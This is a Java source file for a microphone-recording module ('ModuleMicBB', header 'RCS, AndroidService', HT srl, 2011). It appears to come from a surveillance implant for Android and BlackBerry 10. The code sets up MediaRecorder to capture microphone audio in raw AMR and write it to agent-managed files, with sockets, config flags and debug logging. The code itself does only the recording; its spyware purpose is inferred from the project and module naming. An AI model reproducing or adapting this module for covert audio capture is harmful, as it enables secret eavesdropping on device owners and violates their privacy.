/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.media.MediaRecorder;

import com.android.dvci.auto.Cfg;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Utils;

import java.io.FileInputStream;
import java.io.IOException;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public class ModuleMicBB extends ModuleMicL {

	private static final String TAG = "ModuleMicBB"; //$NON-NLS-1$
	/**
	 * Start recorder.
	 *
	 * @throws IllegalStateException the illegal state exception
	 * @throws IOException   Signals that an I/O exception has occurred.
	 */
	synchronized void specificStart() throws IllegalStateException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificStart)");//$NON-NLS-1$
		}
		numFailures = 0;
		unfinished = null;

		if (recorder == null) {
			final DateTime dateTime = new DateTime();
			if(Cfg.BB10 && isRunning() && fId!=0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (specificStart) BB10 don't reinit fId ");//$NON-NLS-1$
				}
			}else {
				fId = dateTime.getFiledate();
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) new recorder ");//$NON-NLS-1$
			}
			recorder = new MediaRecorder();
			recorder.reset();
		}
		if(recorder == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) error requesting recorder ");//$NON-NLS-1$
			}
		}
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		//recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setMaxFileSize(MAX_FILE_SIZE);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		createSockets();
		if (out_file != null) {
			recorder.setOutputFile(out_file.getFilename());
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) out_file null, release recorder");//$NON-NLS-1$
			}
			recorder.reset();  // You can reuse the object by going back to setAudioSource() step
			recorder.release();// Now the object cannot be reused
			recorder = null;
		}
		try {

			recorder.prepare();
			recorder.start(); // Recording is now started
			int ampl = recorder.getMaxAmplitude();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) recorder started ampl" + ampl);//$NON-NLS-1$
			}
			recorder_started = true;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) bb10 cannot reuse a recorder: " + e);//$NON-NLS-1$
			}
			if (recorder != null) {
				recorder.reset();  // You can reuse the object by going back to setAudioSource() step
				recorder.release();// Now the object cannot be reused
				recorder = null;
			}
			if (out_file != null) {
				deleteSockets();
			}
		}
	}

	@Override
	void specificSuspend() {
		super.specificSuspend();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificSuspend): fId=0");
		}
		fId = 0;
	}


}
